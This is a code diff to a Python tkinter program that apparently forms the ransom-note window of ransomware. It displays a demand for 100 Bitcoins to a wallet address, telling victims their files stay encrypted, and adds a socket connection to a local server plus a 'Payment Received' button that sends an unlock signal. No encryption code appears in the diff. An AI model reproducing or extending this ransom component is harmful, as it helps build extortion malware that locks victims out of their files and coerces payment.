@@ -3,6 +3,19 @@ from tkinter.ttk import *
 from tkinter import Tk
 from PIL import ImageTk, Image
 import threading
+import socket, select
+import tkinter.messagebox as box
+
+host = '127.0.0.1'
+port = 5789
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((host,port))
+
+def dialog1():
+        s.send(bytes('payment_received','utf8'))
+        box.showinfo('info','Unlocked')
+
 
 class App(threading.Thread):
     def __init__(self):
@@ -35,8 +48,11 @@ class App(threading.Thread):
         message += "Send 100 Bitcoins to the wallet address mentioned below or your files remain encrypted;)\n"
         message += "                             Wallet Address: 3FxAwHJ6AvmnU8NAoY8qFVEteddRbdkjhx"
 
+        btn = Button(frame, text = 'Payment Received',command = dialog1)
+        btn.pack(side = RIGHT , padx =5)
         l = Label(self.root, text = message)
         l.config(font =("Courier", 14))
         l.pack()
 
         self.root.mainloop()
+    
